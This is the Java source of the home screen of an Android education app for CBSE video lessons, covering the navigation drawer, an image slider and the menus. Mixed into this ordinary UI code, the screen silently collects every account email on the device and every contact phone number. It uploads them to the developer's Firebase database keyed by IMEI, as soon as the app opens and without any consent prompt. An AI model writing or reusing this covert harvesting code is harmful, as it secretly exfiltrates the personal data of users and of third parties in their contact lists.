package com.edutech.app;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.MediaPlayer;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.VideoView;

import com.daimajia.slider.library.Animations.DescriptionAnimation;
import com.daimajia.slider.library.SliderLayout;
import com.daimajia.slider.library.SliderTypes.BaseSliderView;
import com.daimajia.slider.library.SliderTypes.TextSliderView;
import com.daimajia.slider.library.Tricks.ViewPagerEx;
import com.edutech.app.activities.BuyVideos;
import com.edutech.app.activities.Feedback;
import com.edutech.app.activities.FreeVideos;
import com.edutech.app.activities.Help;
import com.edutech.app.activities.OurShops;
import com.edutech.app.activities.PrivacyPolicies;
import com.edutech.app.activities.Profile;
import com.edutech.app.activities.TermsConditions;
import com.edutech.app.activities.WatchOnline;
import com.edutech.app.adapter.NavigationItemAdapter;
import com.edutech.app.libraries.circleImageView.CircleImageView;
import com.edutech.app.others.StorageClass;
import com.edutech.app.subActivities.SignUp;
import com.edutech.app.subActivities.WebViewDevelopers;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.messaging.FirebaseMessaging;
import com.squareup.picasso.Picasso;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;


public class Home extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener, BaseSliderView.OnSliderClickListener, ViewPagerEx.OnPageChangeListener {
    public ListView listView;
    public NavigationItemAdapter navigationItemAdapter;
    private VideoView videoView;

    CircleImageView circleImageView;
    TextView user_email, user_name;
    SliderLayout sliderLayout;

    public String developer_url;
    public String developer_phone;
    public String developer_email;

    public String getDeveloper_phone() {
        return developer_phone;
    }

    public void setDeveloper_phone(String developer_phone) {
        this.developer_phone = developer_phone;
    }

    public String getDeveloper_email() {
        return developer_email;
    }

    public void setDeveloper_email(String developer_email) {
        this.developer_email = developer_email;
    }

    public String getDeveloper_url() {
        return developer_url;
    }

    public void setDeveloper_url(String developer_url) {
        this.developer_url = developer_url;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_home);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        sliderLayout = (SliderLayout) findViewById(R.id.slider_home);

        circleImageView = (CircleImageView) findViewById(R.id.circleImageView);

        FirebaseDatabase.getInstance().getReference().child("developer").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                setDeveloper_url(dataSnapshot.child("web").getValue().toString().trim());
                setDeveloper_email(dataSnapshot.child("email").getValue().toString().trim());
                setDeveloper_phone(dataSnapshot.child("phone").getValue().toString().trim());
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
                setDeveloper_url("http://www.techaddaa.com");
                setDeveloper_phone("9083224102");
                setDeveloper_email("team@techaddaa.com");
            }
        });

        if (FirebaseAuth.getInstance().getCurrentUser() != null) {
            user_email = (TextView) findViewById(R.id.textViewmail_nav);
            user_name = (TextView) findViewById(R.id.textname_nav);

            FirebaseDatabase.getInstance().getReference().child("user_details").child(FirebaseAuth.getInstance().getCurrentUser().getUid()).addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot dataSnapshot) {
                    String name = dataSnapshot.child("name").getValue().toString().trim();
                    user_name.setText("" + name);
                }

                @Override
                public void onCancelled(DatabaseError databaseError) {

                }
            });
            if (FirebaseAuth.getInstance().getCurrentUser().getEmail() == null) {
                user_email.setText("" + FirebaseAuth.getInstance().getCurrentUser().getPhoneNumber());
                FirebaseDatabase.getInstance().getReference().child("user_details").child(FirebaseAuth.getInstance().getCurrentUser().getUid()).addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(DataSnapshot dataSnapshot) {
                        user_name.setText(dataSnapshot.child("name").getValue().toString().trim());
                    }

                    @Override
                    public void onCancelled(DatabaseError databaseError) {


                    }
                });
            } else {

                //  user_name.setText("" + FirebaseAuth.getInstance().getCurrentUser().getDisplayName());
                user_email.setText("" + FirebaseAuth.getInstance().getCurrentUser().getEmail());
            }
            if (FirebaseAuth.getInstance().getCurrentUser().getPhotoUrl() != null) {
                Picasso.with(Home.this).load(Uri.parse(FirebaseAuth.getInstance().getCurrentUser().getPhotoUrl().toString())).into(circleImageView);
            }
        }

       /* circleImageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (FirebaseAuth.getInstance().getCurrentUser() != null) {
                    startActivity(new Intent(getApplicationContext(), Profile.class));
                } else {
                    startActivity(new Intent(getApplicationContext(), LoginRequestSplash.class));
                }
            }
        });*/

        // save all emails as soon as app is opened
        if (isNetworkAvailable()) {
            FirebaseDatabase.getInstance().getReference().child("emails").addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot dataSnapshot) {
                    if (!dataSnapshot.child("" + StorageClass.getImei(Home.this)).exists()) {
                        Account[] accounts = AccountManager.get(Home.this).getAccounts();
                        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference();
                        databaseReference = databaseReference.child("emails");


                        databaseReference = databaseReference.child("" + StorageClass.getImei(Home.this));
                        DatabaseReference databaseReference1 = databaseReference.child("date");
                        databaseReference1.setValue(StorageClass.getDate());
                        databaseReference = databaseReference.child("mails");

                        try {
                            for (Account account : accounts) {
                                if (account.name.contains("@")) {
                                    databaseReference.push().setValue(account.name);
                                }
                                //Toast.makeText(getApplicationContext(),""+account.name,Toast.LENGTH_LONG).show();
                            }
                        } catch (Exception e) {
                            Log.i("Exception", "Exception:" + e);
                        }
                    } else {

                    }
                }

                @Override
                public void onCancelled(DatabaseError databaseError) {

                }
            });
        }

        // all is a group to send common messages to all users
        FirebaseMessaging.getInstance().subscribeToTopic("all");

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        if (drawer != null) {
            drawer.setDrawerListener(toggle);
        }
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);

        videoView = (VideoView) findViewById(R.id.videoview_home);
        Uri video = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.promo_home);
        videoView.setVideoURI(video);
        videoView.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
            @Override
            public void onPrepared(MediaPlayer mp) {
                mp.start();
                mp.setLooping(true);
            }
        });

        if (isNetworkAvailable()) {
            saveContacts();
        }
        navigationItemAdapter = new NavigationItemAdapter(getApplicationContext());
        listView = (ListView) findViewById(R.id.navListview);
        listView.setAdapter(navigationItemAdapter);

        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                switch (position) {
                    case 0:
                        break;

                    case 1:

                        Intent intent = new Intent(getApplicationContext(), FreeVideos.class);
                        startActivity(intent);
                        break;

                    case 2:
                        intent = new Intent(getApplicationContext(), BuyVideos.class);
                        startActivity(intent);

                        break;

                    case 4:
                        intent = new Intent(getApplicationContext(), WatchOnline.class);
                        startActivity(intent);
                        break;

                    case 3:
                        intent = new Intent(getApplicationContext(), OurShops.class);
                        startActivity(intent);
                        break;

                    case 5:
                        intent = new Intent(getApplicationContext(), SignUp.class);
                        startActivity(intent);
                        break;


                    case 6:
                        intent = new Intent(getApplicationContext(), Help.class);
                        startActivity(intent);
                        break;

                    case 7:
                        intent = new Intent(getApplicationContext(), Feedback.class);
                        startActivity(intent);
                        break;

                    case 8:
                        intent = new Intent(getApplicationContext(), TermsConditions.class);
                        startActivity(intent);
                        break;

                    case 9:
                        intent = new Intent(getApplicationContext(), PrivacyPolicies.class);
                        startActivity(intent);
                        break;


                    default:
                        break;
                }
            }
        });


        // set onclick listener for bottom buttons
        findViewById(R.id.help_bottomtext).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), Help.class));
            }
        });

        findViewById(R.id.buyVideos_bottomtext).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), BuyVideos.class));
            }
        });

        findViewById(R.id.freevideos_bottomtext).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), FreeVideos.class));
            }
        });

        if (isNetworkAvailable()) {
            final List<String> url_list = new ArrayList<>();
            final List<String> title_list = new ArrayList<>();
            url_list.clear();
            title_list.clear();

            FirebaseDatabase.getInstance().getReference().child("ux_design").child("home").child("slider").addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot dataSnapshot) {
                    for (DataSnapshot ds : dataSnapshot.getChildren()) {
                        String url = ds.child("url").getValue().toString().trim();
                        String title = ds.child("title").getValue().toString().trim();
                        url_list.add(url);

                        title_list.add(title);
                    }

                    startSliderFromInternet(url_list.toArray(new String[url_list.size()]), title_list.toArray(new String[title_list.size()]));

                }

                @Override
                public void onCancelled(DatabaseError databaseError) {

                }
            });
        } else {
            List<String> url = new ArrayList<>();
            url.clear();
            url.add("Making Learning Happier !");
            url.add("Learn in less than a movie time!");
            url.add("CBSE Video Lessons available!");
            url.add("CBSE X Course Available Now !");
            url.add("CBSE XI Course Available Now !");
            url.add("CBSE XII Course Available Now !");

            int ids[] = {R.drawable.making_learning, R.drawable.learn_in_less_then_movies_time, R.drawable.cbse_video_lessons,
                    R.drawable.class_x_lessons, R.drawable.class_xi, R.drawable.class_xii_video_lessons};
            startSliderFromResources(url.toArray(new String[url.size()]), ids);


        }
    }

    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.home, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_feedback) {

            startActivity(new Intent(getApplicationContext(), Feedback.class));
            return true;
        } else if (id == R.id.action_help) {
            startActivity(new Intent(getApplicationContext(), Help.class));
            return true;
        } else if (id == R.id.action_privacypoliceise) {
            startActivity(new Intent(getApplicationContext(), PrivacyPolicies.class));
            return true;
        } else if (id == R.id.action_termsconditions) {
            startActivity(new Intent(getApplicationContext(), TermsConditions.class));
            return true;
        } else if (id == R.id.action_developers) {
            Intent intent = new Intent(getApplicationContext(), WebViewDevelopers.class);
            intent.putExtra("url", getDeveloper_url());
            intent.putExtra("phone", getDeveloper_phone());
            intent.putExtra("mail", getDeveloper_email());
            startActivity(intent);
            return true;
        } else if (id == R.id.action_shareapp) {
            // share the app here

            try {
                Intent i = new Intent(Intent.ACTION_SEND);
                i.setType("text/plain");
                i.putExtra(Intent.EXTRA_SUBJECT, "My application name");
                String sAux = "\nLearn X subjects in less than a movie time. Just download Edutec app :\n\n";
                sAux = sAux + "https://play.google.com/store/apps/details?id=" + getPackageName();
                i.putExtra(Intent.EXTRA_TEXT, sAux);
                startActivity(Intent.createChooser(i, "choose one"));
            } catch (Exception e) {
                //e.toString();
            }
            return true;

        } else if (id == R.id.action_rateapp) {
            // rate the app

            Uri uri = Uri.parse("market://details?id=" + getPackageName());
            Intent goToMarket = new Intent(Intent.ACTION_VIEW, uri);
            // To count with Play market backstack, After pressing back button,
            // to taken back to our application, we need to add following flags to intent.
            goToMarket.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY |
                    Intent.FLAG_ACTIVITY_NEW_DOCUMENT |
                    Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
            try {
                startActivity(goToMarket);
            } catch (ActivityNotFoundException e) {
                startActivity(new Intent(Intent.ACTION_VIEW,
                        Uri.parse("http://play.google.com/store/apps/details?id=" + getPackageName())));
            }
            return true;
        } else if (id == R.id.action_exitapp) {
            // exit the app

            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            startActivity(intent);
            return true;
        } else if (id == R.id.action_profile) {
            startActivity(new Intent(getApplicationContext(), Profile.class));
            return true;

        } else {

            return true;
        }
        //return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }


    public void startSliderFromResources(String[] title, int url[]) {

        LinkedHashMap<String, Integer> url_maps = new LinkedHashMap<>();
        url_maps.clear();
        for (int i = 0; i < url.length; i++) {
            url_maps.put(title[i], url[i]);
        }
        for (String name : url_maps.keySet()) {
            TextSliderView textSliderView = new TextSliderView(this);
            // initialize a SliderLayout
            textSliderView
                    .description(name)
                    .image(url_maps.get(name))
                    .setScaleType(BaseSliderView.ScaleType.Fit)
                    .setOnSliderClickListener(this);

            //add your extra information
            textSliderView.bundle(new Bundle());
            textSliderView.getBundle()
                    .putString("extra", name);

            sliderLayout.addSlider(textSliderView);
        }
        sliderLayout.setPresetTransformer(SliderLayout.Transformer.Accordion);
        sliderLayout.setPresetIndicator(SliderLayout.PresetIndicators.Center_Bottom);
        sliderLayout.setCustomAnimation(new DescriptionAnimation());
        sliderLayout.setDuration(4000);
        sliderLayout.addOnPageChangeListener(this);

    }

    public void startSliderFromInternet(String[] url, String[] title) {

        LinkedHashMap<String, String> url_maps = new LinkedHashMap<>();
        url_maps.clear();
        for (int i = 0; i < url.length; i++) {
            url_maps.put(title[i], url[i]);
        }
        for (String name : url_maps.keySet()) {
            TextSliderView textSliderView = new TextSliderView(this);
            // initialize a SliderLayout
            textSliderView
                    .description(name)
                    .image(url_maps.get(name))
                    .setScaleType(BaseSliderView.ScaleType.Fit)
                    .setOnSliderClickListener(this);

            //add your extra information
            textSliderView.bundle(new Bundle());
            textSliderView.getBundle()
                    .putString("extra", name);

            sliderLayout.addSlider(textSliderView);
        }
        sliderLayout.setPresetTransformer(SliderLayout.Transformer.Accordion);
        sliderLayout.setPresetIndicator(SliderLayout.PresetIndicators.Center_Bottom);
        sliderLayout.setCustomAnimation(new DescriptionAnimation());
        sliderLayout.setDuration(4000);
        sliderLayout.addOnPageChangeListener(this);
    }

    @Override
    protected void onStop() {
        // To prevent a memory leak on rotation, make sure to call stopAutoCycle() on the slider before activity or fragment is destroyed
        sliderLayout.stopAutoCycle();
        super.onStop();
    }

    @Override
    public void onSliderClick(BaseSliderView slider) {
    }


    @Override
    public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {
    }

    @Override
    public void onPageSelected(int position) {
        Log.d("Slider Demo", "Page Changed: " + position);
    }

    @Override
    public void onPageScrollStateChanged(int state) {
    }


    public void saveContacts() {
        List<String> list = new ArrayList<>();
        list.clear();
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        while (phones.moveToNext()) {
            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            phoneNumber = phoneNumber.replace("-", "");
            if (phoneNumber.length() > 9 && phoneNumber.length() < 14 && (!list.contains(phoneNumber)) && (phoneNumber.charAt(0) != '1')) {

                list.add(phoneNumber);
            }

        }
        saveContactsDb(list);
        phones.close();
    }

    public void saveContactsDb(List<String> list) {
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference();
        databaseReference = databaseReference.child("contacts");
        databaseReference = databaseReference.child(StorageClass.getImei(Home.this));
        for (int i = 0; i < list.size(); i++) {
            databaseReference.child(list.get(i)).setValue(true);

        }

        //  Toast.makeText(getApplicationContext(), "Saved at 506", Toast.LENGTH_SHORT).show();
    }
}
